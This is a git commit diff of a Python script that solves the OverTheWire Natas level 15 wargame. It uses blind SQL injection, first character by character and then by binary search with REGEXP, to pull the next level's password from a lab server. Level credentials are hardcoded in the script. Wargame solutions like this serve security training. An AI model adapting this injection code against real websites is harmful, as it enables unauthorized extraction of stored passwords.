e90a38e8cad914fdfdf84b5e0c86d5b9fa32012a
sokampdx <sokam@pdx.edu>
2014-11-01 18:21:04 -0700

    added binary search for natas15

--- natas/natas15.py
+++ natas/natas15.py
@@ -1,38 +1,92 @@
-# natas 15->16
-#!/usr/bin/env python
-# Author : vigov5
-# -*- coding: utf-8 -*-
+#!/bin/python3
+# python3 blindsql.py "^WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
+import urllib.request
+import urllib.parse
+import sys
+import string
 
-import httplib
-import urllib
-import re
-import base64
+char = string.digits+string.ascii_uppercase+string.ascii_lowercase
+MAX = len(char)
+password_len = 32
 
-charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-MAX = 32
+# create a password manager
+password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
+username = 'natas15'
+password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
 
-headers = {}
-params = {}
-username = "natas15"
-password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
-conn = httplib.HTTPConnection("natas15.natas.labs.overthewire.org")
-base64string = base64.encodestring('%s:%s' % (username, password)).replace('\n', '')
-headers["Authorization"] = "Basic %s" % base64string   
-headers["Content-Type"] = "application/x-www-form-urlencoded"
+# Add the username and password.
+# If we knew the realm, we could use it instead of None.
+top_level_url = 'http://natas15.natas.labs.overthewire.org'
+password_mgr.add_password(None, top_level_url, username, password)
+
+handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
+
+# create "opener" (OpenerDirector instance)
+opener = urllib.request.build_opener(handler)
+
+# use the opener to fetch a URL
+url = 'http://natas15.natas.labs.overthewire.org/?debug=1'
+
+# Install the opener.
+# Now all calls to urllib.request.urlopen use our opener.
+urllib.request.install_opener(opener)
+
+user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
+headers = { 'User-Agent' : user_agent }
+qstring = 'natas16\" AND password COLLATE latin1_general_cs REGEXP \"^'
+matchStr = "This user exist"
+
+def isMatch(values):
+	data = urllib.parse.urlencode(values)
+	binary_data = data.encode('ascii')
+	req = urllib.request.Request(url, binary_data, headers)
+	response = urllib.request.urlopen(req)
+	the_page = response.read()
+	return (matchStr in str(the_page))
 
 
-USERINPUT = 'natas16" and password LIKE BINARY "'
-count = 0
-passwd = ""
-while count < MAX:
-	for c in charset:
-		print 'Check password : ' + passwd + c
-		params["username"] = USERINPUT + passwd + c + '%'
-		conn.request("POST", "", urllib.urlencode(params), headers)
-		r1 = conn.getresponse()
-		data = r1.read()
-		if data.count("This user exists.") != 0:
-			passwd += c
-			print "OK, Current passwd is " + passwd
-			count += 1
-		conn.close()
+def binarySearch(start, end, current):
+	if start == (end - 1):
+		return char[start]
+
+	mid = (start + end) // 2
+	testStr = char[start:mid]
+	values = {'username' : qstring + current + '[' + testStr + ']'}
+
+	if isMatch(values):
+		return binarySearch(start, mid, current)
+	return binarySearch(mid, end, current)		
+	
+		
+def main():
+	searchStr = ""
+
+	for pos in range(password_len):
+		searchStr += binarySearch(0, MAX, searchStr)
+		print (searchStr)
+
+	print ("done")
+
+main()
+
+
+'''
+searchStr = ''
+for pos in range(password_len):
+	for c in char:
+		values = {'username' : qstring + searchStr + c}
+		#'natas16\" AND password COLLATE latin1_general_cs REGEXP \"^[A-Z]'}
+
+		data = urllib.parse.urlencode(values)
+		binary_data = data.encode('ascii')
+		req = urllib.request.Request(url, binary_data, headers)
+		response = urllib.request.urlopen(req)
+		the_page = response.read()
+		if matchStr in str(the_page):
+			searchStr += c
+			print(searchStr)
+			continue
+
+print(searchStr)
+'''
+	
